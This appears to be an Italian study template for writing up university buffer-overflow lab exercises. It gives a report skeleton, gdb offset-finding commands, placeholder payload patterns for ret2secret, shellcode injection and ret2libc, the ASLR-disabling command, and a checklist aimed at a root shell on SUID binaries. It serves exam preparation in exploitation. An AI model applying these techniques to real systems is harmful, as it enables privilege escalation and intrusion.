# Template — deliverable Binary Exploitation (bof.txt / pwn.txt + screenshot)

> Struttura riutilizzabile per il resoconto testuale richiesto negli esercizi di Binary Exploitation
> (il file si chiama `bof.txt` nelle consegne 2021–2024, `pwn.txt` in quelle 2025–2026). Ogni sezione
> indica, tra `[ ]`, **da dove** ricavare l'informazione e **con quale comando**. Generalizzato per
> ogni ramo (ret2secret-function / shellcode injection / ret2libc) e per PIE/non-PIE, SUID o no.
> Vedi `modello_binary_exploitation.md` per 7 esempi reali compilati, `guida_esame_binary.md` per la
> scelta del ramo, `procedura_operativa_binary.md` per le zone grigie.
>
> ⚠️ **Il livello di dettaglio della descrizione è criterio di valutazione esplicito**: includi il
> ragionamento (perché quell'offset, perché quella funzione/quel bad char), non solo la sequenza di
> comandi. Puoi includere anche i tentativi falliti (utile: dimostra il metodo).

---

## A. File di testo — `bof.txt` / `pwn.txt`

```
=========================================================
BOF.TXT / PWN.TXT — Esercizio <data> (<nome binario>)
Binary Exploitation — buffer overflow x86_32
=========================================================

FLAG:
  SEC{<...>}                    [ ret2secret: stampata dalla funzione target ]
                                [ shellcode/ret2libc: se l'obiettivo è una shell, riporta invece
                                  l'output di `id`/il prompt ottenuto ]

[ SOLO se richiesta la password (bonus ex6/ex7): ]
PASSWORD:
  <password>                    [ da `strings <bin>` oppure da gdb: x/s $eax a un breakpoint
                                  prima della strcmp — vedi sezione BONUS in fondo ]

PAYLOAD FINALE:
  [ input via ARGV (i 7 casi del pool): ]
  ./<bin> $(python -c 'print("A"*<OFFSET> + "<...little-endian...>")')
                                [ o perl -e 'print "A"x<OFFSET>, "<...>"' ]
  [ input via STDIN (binario gets/fgets/read — vedi guida §4-bis): il payload è lo stesso,
    cambia il TRASPORTO. Riporta il comando effettivamente usato, es: ]
  python3 -c 'import sys; sys.stdout.buffer.write(b"A"*<OFFSET> + b"<...>")' | ./<bin>
                                [ oppure  ./<bin> < payload.bin  /  ./<bin> <<< "$(...)" ]
  [ ret2secret:      "A"*OFFSET + <indirizzo funzione, byte invertiti> ]
  [ shellcode inj.:  "\x90"*(OFFSET-LEN) + <shellcode LEN byte> + <indirizzo nel NOP sled> ]
  [ ret2libc:        "\x90"*OFFSET + <system> + <exit> + <addr "/bin/sh"> , con "$( )" QUOTATO ]
  [ NB stdin: 0x00 diventa USABILE, 0x0a (newline) è il nuovo bad char — vedi guida §4-bis.3 ]

---------------------------------------------------------
DESCRIZIONE DEI PASSAGGI
---------------------------------------------------------

0. Ambiente
   - ASLR disabilitata:  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space   (verifica: cat ... = 0)
   [ motiva: serve per avere indirizzi stabili tra gdb ed esecuzione standalone ]

1. Triage del binario
   - file ./<bin>              → ELF 32-bit i386
   - readelf -lW ./<bin> | grep GNU_STACK   → <RWE = stack eseguibile | RW = NX attivo>
   - nm ./<bin> (funzioni)     → <PIE (0x0000..) | non-PIE (0x0804..)>; funzioni segrete presenti? <sì/no>
   - ls -l ./<bin>             → <SUID? sì/no>
   - vettore d'ingresso        → <argv (./bin $(…)) | stdin (gets/fgets/read → payload su pipe/file, guida §4-bis)>
   [ conclusione triage: il ramo scelto è <ret2secret-function | shellcode injection | ret2libc> perché <...> ]

2. Ricerca dell'offset (bisezione)
   [ incolla i tentativi significativi con l'interpretazione del crash: ]
   (gdb) run $(perl -e 'print "A"x<N>')        → <SIGSEGV in <func> = corto (EBP) | SIGILL = ret storto | ...>
   (gdb) run $(perl -e 'print "A"x<OFF>,"BBBB"') → Program received signal SIGSEGV, 0x42424242 in ?? ()
   [ conclusione: offset = <OFF> byte, perché con OFF A + BBBB l'EIP vale esattamente 0x42424242 ]

3. Individuazione dell'indirizzo target
   [ ret2secret: elenca le funzioni candidate e i tentativi ]
     info functions  (dopo un `run`, se PIE)  →
        0x........  <func1>   → <output decoy>
        0x........  <funcOK>  → SEC{...}   ✅
     [ spiega: il nome NON è affidabile, provate tutte finché non compare SEC{...} ]
   [ shellcode: x/200xw $esp → fascia dei 0x41414141; indirizzo NOP sled scelto = 0x........ ]
   [ ret2libc: p system = 0x........ ; p exit = 0x........ ; find $esp,+0x3000,"SHELL=" → /bin/sh a 0x........+6 ]

4. Costruzione del payload finale
   [ come si compone, con il valore in little-endian e il perché di ogni pezzo ]
   [ eventuali bad character incontrati e come risolti (0x00 → indirizzo vicino / 0x20 → quoting del $()) ]

5. Esecuzione e risultato
   [ ret2secret: ./<bin> <payload> → SEC{...} (poi Segmentation fault, atteso: la flag esce prima) ]
   [ shellcode/ret2libc: shell aperta; se SUID → id → uid=0(root), verificato FUORI da gdb ]

---------------------------------------------------------
[ BONUS — recupero password, solo ex6/ex7 ]
---------------------------------------------------------
Metodo A (in chiaro):   strings ./<bin>  → <password>
Metodo B (de-offuscata): b *<addr prima di strcmp> ; run ciao ; x/s $eax → <password>
[ nota: il metodo B funziona solo se il programma de-offusca la password per confrontarla;
  non funziona per sistemi reali che hashano l'input e confrontano col digest ]
```

---

## B. Screenshot da consegnare

La consegna chiede **2 o più** screenshot. Nomi ricorrenti nel pool: `overflow.png`, `payload.png`,
`exploit.png`, `overflowNN.png`. Copertura minima:

| Screenshot | Cosa deve mostrare | Comando che lo produce |
|---|---|---|
| **overflow.png** (controllo del ret address) | il crash con `0x42424242 in ?? ()` dal payload `A`*OFFSET + `BBBB` — prova che controlli l'indirizzo di ritorno | `(gdb) run $(perl -e 'print "A"x<OFF>,"BBBB"')` |
| **payload.png / exploit.png** (exploit riuscito) | il payload finale + il risultato: `SEC{...}` stampata, **oppure** la shell ottenuta (`$`, `executing new program: /bin/sh`, `id` → `uid=0`) | argv: `./<bin> $(python -c '...')` — **stdin**: `python3 -c '...' \| ./<bin>` (o `./<bin> < payload.bin`) |
| (opzionali `overflowNN.png`) | i tentativi intermedi / le funzioni decoy provate — utili quando la consegna chiede "la metodologia di ricerca" (ex6/ex7) | i vari `run` di bisezione e prova funzioni |

**Regole per gli screenshot** (dai deliverable persi al revert VM, memory `feedback_deliverable_vm_revert`):
- Cattura gli screenshot **durante** l'esercizio, non a fine sessione — se la VM viene ripristinata a
  uno snapshot pulito perdi i file.
- Assicurati che nello screenshot siano leggibili: il **comando completo** (payload incluso) e
  l'**output rilevante** (`0x42424242 in ?? ()`, oppure `SEC{...}` / il prompt di shell / `uid=0`).

---

## C. Confezionamento finale

```bash
ls -la     # verifica di avere il file di testo (bof.txt/pwn.txt) + tutti gli screenshot richiesti
```
Rispetta il **nome file** esatto della consegna (`bof.txt` vs `pwn.txt`; `overflow.png`/`payload.png`
vs `overflowNN.png`) e il **numero minimo** di screenshot richiesto.

---

## Checklist rapida prima di consegnare

- [ ] Offset e indirizzi sono **quelli del binario d'esame**, trovati da te (non copiati dal modello).
- [ ] La sezione bisezione mostra il crash `0x42424242 in ?? ()` che **prova** il controllo del ret address.
- [ ] (ret2secret) Hai provato **tutte** le funzioni candidate e riconosciuto `SEC{...}` come unica valida
      — e lo hai scritto (dimostra il metodo, non solo il risultato).
- [ ] Eventuali **bad character** incontrati sono documentati col rimedio applicato (indirizzo vicino / quoting).
- [ ] Il payload finale nel testo è **esattamente** quello dello screenshot dell'exploit riuscito.
- [ ] (shellcode/ret2libc) L'esito è verificato **fuori** da gdb; se SUID, lo screenshot mostra `uid=0(root)`.
- [ ] La descrizione spiega il **perché** (offset, scelta funzione, meccanismo del bypass), non è solo
      un elenco di comandi — il dettaglio è criterio di voto.
- [ ] (bonus) Se richiesta, la password è riportata con il metodo usato per ottenerla.

<!-- AUTO-LINKS:START -->
## 🔗 Collegati

- [[guida_esame_binary]]
- [[procedura_operativa_binary]]
- [[modello_binary_exploitation]]

**Hub:** [[master_map_studio]] · [[metodo_studio_esami_pratici]]
<!-- AUTO-LINKS:END -->
